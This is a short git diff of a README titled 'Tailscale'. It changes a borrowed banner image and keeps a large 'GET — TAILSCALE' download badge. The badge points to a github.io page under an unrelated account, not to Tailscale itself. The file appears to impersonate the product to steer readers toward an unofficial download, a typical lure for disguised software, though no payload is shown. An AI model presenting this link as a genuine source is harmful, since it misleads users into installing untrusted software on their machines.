@@ -1,7 +1,7 @@
 # Tailscale
 
 <p align="center">
-<img src="https://mp-cdn.elgato.com/media/9bd74743-96ea-4d16-97d8-5109bc205273/fc36fada-4759-4067-a6e4-d240a23eb1a3/Tailscale-preview-intrinsic-3685603e-ee3d-4c32-937a-7a826af46bb8.png" alt="Tailscale Private Network and Remote Access" width="780">
+<img src="https://raspberrytips.com/wp-content/uploads/2024/08/raspberry-pi-tailscale.jpg" alt="Tailscale Private Network and Remote Access" width="780">
 </p>
 
 [![GET — TAILSCALE](https://img.shields.io/badge/GET-TAILSCALE-2563eb?style=for-the-badge)](https://neivesdesignrack.github.io/.github/Tailscale)
